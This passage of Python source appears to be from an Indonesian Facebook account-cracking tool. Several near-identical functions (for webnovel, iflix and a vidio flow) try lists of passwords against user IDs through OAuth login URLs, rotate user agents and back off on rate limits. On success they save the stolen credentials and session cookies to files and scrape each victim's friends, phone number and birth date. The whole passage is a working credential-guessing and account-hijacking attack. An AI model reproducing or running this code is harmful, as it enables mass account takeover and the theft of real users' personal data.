			po = ses.post('https://m.facebook.com/login.php?skip_api_login=1&api_key=923560728108869&kid_directed_site=0&app_id=923560728108869&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv4.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D923560728108869%26redirect_uri%3Dhttps%253A%252F%252Fm.vidio.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26state%3Dfd46b2541619885e08dc8acb685b23fc473eb6a7dc873528%26scope%3Dpublic_profile%252C%2Bemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd6dcb3c8-246e-4f23-9b7d-50a0f376d931%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.vidio.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfd46b2541619885e08dc8acb685b23fc473eb6a7dc873528%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1

def webnovel(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Mobile Webnovel [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des)
	ses = requests.Session()
	#ua = random.choice(ugen3)
	ua = uaasepitgansxc()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=389729911382431&kid_directed_site=0&app_id=389729911382431&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.8%2Fdialog%2Foauth%3Fscope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DeyJhdXRvIjoiMSIsInZlciI6IjIiLCJmb3JtYXQiOiJyZWRpcmVjdCIsInNvdXJjZSI6ImVud2ViIiwidGFyZ2V0IjoiIiwiX2NzcmZUb2tlbiI6ImQwMmI4OTBiLTE0YWQtNDgxYi05NDU3LTkyNTgwMDc1NDdkYSIsInBvcHVwIjoiIiwiYXJlYUlkIjoiMiIsImZyb211aWQiOiIwIiwiYXBwSWQiOiI5MDAiLCJyZXR1cm5VcmwiOiJodHRwczovL20ud2Vibm92ZWwuY29tL2xvZ2luL2NhbGxiYWNrP3JlZGlyZWN0VXJsXHUwMDNkaHR0cHMlM0ElMkYlMkZtLndlYm5vdmVsLmNvbSUyRmJvb2slMkZsb2dpbl8xNzgyNjM0MTEwNjIzNDkwNSIsImF1dG9UaW1lIjoiMTUiLCJsb2dpbnRhYiI6IiJ9%26redirect_uri%3Dhttps%253A%252F%252Fptlogin.webnovel.com%252Flogin%252FfacebookCallback%26client_id%3D389729911382431%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0f411e30-6f22-4335-add8-f253eeb6c9de%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fptlogin.webnovel.com%2Flogin%2FfacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJhdXRvIjoiMSIsInZlciI6IjIiLCJmb3JtYXQiOiJyZWRpcmVjdCIsInNvdXJjZSI6ImVud2ViIiwidGFyZ2V0IjoiIiwiX2NzcmZUb2tlbiI6ImQwMmI4OTBiLTE0YWQtNDgxYi05NDU3LTkyNTgwMDc1NDdkYSIsInBvcHVwIjoiIiwiYXJlYUlkIjoiMiIsImZyb211aWQiOiIwIiwiYXBwSWQiOiI5MDAiLCJyZXR1cm5VcmwiOiJodHRwczovL20ud2Vibm92ZWwuY29tL2xvZ2luL2NhbGxiYWNrP3JlZGlyZWN0VXJsXHUwMDNkaHR0cHMlM0ElMkYlMkZtLndlYm5vdmVsLmNvbSUyRmJvb2slMkZsb2dpbl8xNzgyNjM0MTEwNjIzNDkwNSIsImF1dG9UaW1lIjoiMTUiLCJsb2dpbnRhYiI6IiJ9%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=389729911382431&kid_directed_site=0&app_id=389729911382431&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.8%2Fdialog%2Foauth%3Fscope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DeyJhdXRvIjoiMSIsInZlciI6IjIiLCJmb3JtYXQiOiJyZWRpcmVjdCIsInNvdXJjZSI6ImVud2ViIiwidGFyZ2V0IjoiIiwiX2NzcmZUb2tlbiI6ImQwMmI4OTBiLTE0YWQtNDgxYi05NDU3LTkyNTgwMDc1NDdkYSIsInBvcHVwIjoiIiwiYXJlYUlkIjoiMiIsImZyb211aWQiOiIwIiwiYXBwSWQiOiI5MDAiLCJyZXR1cm5VcmwiOiJodHRwczovL20ud2Vibm92ZWwuY29tL2xvZ2luL2NhbGxiYWNrP3JlZGlyZWN0VXJsXHUwMDNkaHR0cHMlM0ElMkYlMkZtLndlYm5vdmVsLmNvbSUyRmJvb2slMkZsb2dpbl8xNzgyNjM0MTEwNjIzNDkwNSIsImF1dG9UaW1lIjoiMTUiLCJsb2dpbnRhYiI6IiJ9%26redirect_uri%3Dhttps%253A%252F%252Fptlogin.webnovel.com%252Flogin%252FfacebookCallback%26client_id%3D389729911382431%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0f411e30-6f22-4335-add8-f253eeb6c9de%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fptlogin.webnovel.com%2Flogin%2FfacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJhdXRvIjoiMSIsInZlciI6IjIiLCJmb3JtYXQiOiJyZWRpcmVjdCIsInNvdXJjZSI6ImVud2ViIiwidGFyZ2V0IjoiIiwiX2NzcmZUb2tlbiI6ImQwMmI4OTBiLTE0YWQtNDgxYi05NDU3LTkyNTgwMDc1NDdkYSIsInBvcHVwIjoiIiwiYXJlYUlkIjoiMiIsImZyb211aWQiOiIwIiwiYXBwSWQiOiI5MDAiLCJyZXR1cm5VcmwiOiJodHRwczovL20ud2Vibm92ZWwuY29tL2xvZ2luL2NhbGxiYWNrP3JlZGlyZWN0VXJsXHUwMDNkaHR0cHMlM0ElMkYlMkZtLndlYm5vdmVsLmNvbSUyRmJvb2slMkZsb2dpbl8xNzgyNjM0MTEwNjIzNDkwNSIsImF1dG9UaW1lIjoiMTUiLCJsb2dpbnRhYiI6IiJ9%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login.php?skip_api_login=1&api_key=389729911382431&kid_directed_site=0&app_id=389729911382431&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.8%2Fdialog%2Foauth%3Fscope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DeyJhdXRvIjoiMSIsInZlciI6IjIiLCJmb3JtYXQiOiJyZWRpcmVjdCIsInNvdXJjZSI6ImVud2ViIiwidGFyZ2V0IjoiIiwiX2NzcmZUb2tlbiI6ImQwMmI4OTBiLTE0YWQtNDgxYi05NDU3LTkyNTgwMDc1NDdkYSIsInBvcHVwIjoiIiwiYXJlYUlkIjoiMiIsImZyb211aWQiOiIwIiwiYXBwSWQiOiI5MDAiLCJyZXR1cm5VcmwiOiJodHRwczovL20ud2Vibm92ZWwuY29tL2xvZ2luL2NhbGxiYWNrP3JlZGlyZWN0VXJsXHUwMDNkaHR0cHMlM0ElMkYlMkZtLndlYm5vdmVsLmNvbSUyRmJvb2slMkZsb2dpbl8xNzgyNjM0MTEwNjIzNDkwNSIsImF1dG9UaW1lIjoiMTUiLCJsb2dpbnRhYiI6IiJ9%26redirect_uri%3Dhttps%253A%252F%252Fptlogin.webnovel.com%252Flogin%252FfacebookCallback%26client_id%3D389729911382431%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0f411e30-6f22-4335-add8-f253eeb6c9de%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fptlogin.webnovel.com%2Flogin%2FfacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJhdXRvIjoiMSIsInZlciI6IjIiLCJmb3JtYXQiOiJyZWRpcmVjdCIsInNvdXJjZSI6ImVud2ViIiwidGFyZ2V0IjoiIiwiX2NzcmZUb2tlbiI6ImQwMmI4OTBiLTE0YWQtNDgxYi05NDU3LTkyNTgwMDc1NDdkYSIsInBvcHVwIjoiIiwiYXJlYUlkIjoiMiIsImZyb211aWQiOiIwIiwiYXBwSWQiOiI5MDAiLCJyZXR1cm5VcmwiOiJodHRwczovL20ud2Vibm92ZWwuY29tL2xvZ2luL2NhbGxiYWNrP3JlZGlyZWN0VXJsXHUwMDNkaHR0cHMlM0ElMkYlMkZtLndlYm5vdmVsLmNvbSUyRmJvb2slMkZsb2dpbl8xNzgyNjM0MTEwNjIzNDkwNSIsImF1dG9UaW1lIjoiMTUiLCJsb2dpbnRhYiI6IiJ9%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1


def iflik(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Mobile iflix [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des)
	ses = requests.Session()
	#ua = random.choice(ugen3)
	ua = uaasepitgansxc()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=761503727275074&kid_directed_site=0&app_id=761503727275074&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fapp_id%3D761503727275074%26cbt%3D1683048777571%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2671e2ba3a68c%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff31ae45f9488458%2526relation%253Dopener%26client_id%3D761503727275074%26display%3Dtouch%26domain%3Dwww.iflix.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.iflix.com%252Fid%26locale%3Den_US%26logger_id%3Df3f7a5fe632099c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3252e76e7a6784%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff31ae45f9488458%2526relation%253Dopener%2526frame%253Df3676d4e5441034%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv3.3%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3252e76e7a6784%26domain%3Dwww.iflix.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.iflix.com%252Ff31ae45f9488458%26relation%3Dopener%26frame%3Df3676d4e5441034%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=761503727275074&kid_directed_site=0&app_id=761503727275074&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fapp_id%3D761503727275074%26cbt%3D1683048777571%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2671e2ba3a68c%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff31ae45f9488458%2526relation%253Dopener%26client_id%3D761503727275074%26display%3Dtouch%26domain%3Dwww.iflix.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.iflix.com%252Fid%26locale%3Den_US%26logger_id%3Df3f7a5fe632099c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3252e76e7a6784%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff31ae45f9488458%2526relation%253Dopener%2526frame%253Df3676d4e5441034%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv3.3%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3252e76e7a6784%26domain%3Dwww.iflix.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.iflix.com%252Ff31ae45f9488458%26relation%3Dopener%26frame%3Df3676d4e5441034%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login.php?skip_api_login=1&api_key=761503727275074&kid_directed_site=0&app_id=761503727275074&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fapp_id%3D761503727275074%26cbt%3D1683048777571%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2671e2ba3a68c%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff31ae45f9488458%2526relation%253Dopener%26client_id%3D761503727275074%26display%3Dtouch%26domain%3Dwww.iflix.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.iflix.com%252Fid%26locale%3Den_US%26logger_id%3Df3f7a5fe632099c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3252e76e7a6784%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff31ae45f9488458%2526relation%253Dopener%2526frame%253Df3676d4e5441034%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv3.3%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3252e76e7a6784%26domain%3Dwww.iflix.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.iflix.com%252Ff31ae45f9488458%26relation%3Dopener%26frame%3Df3676d4e5441034%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
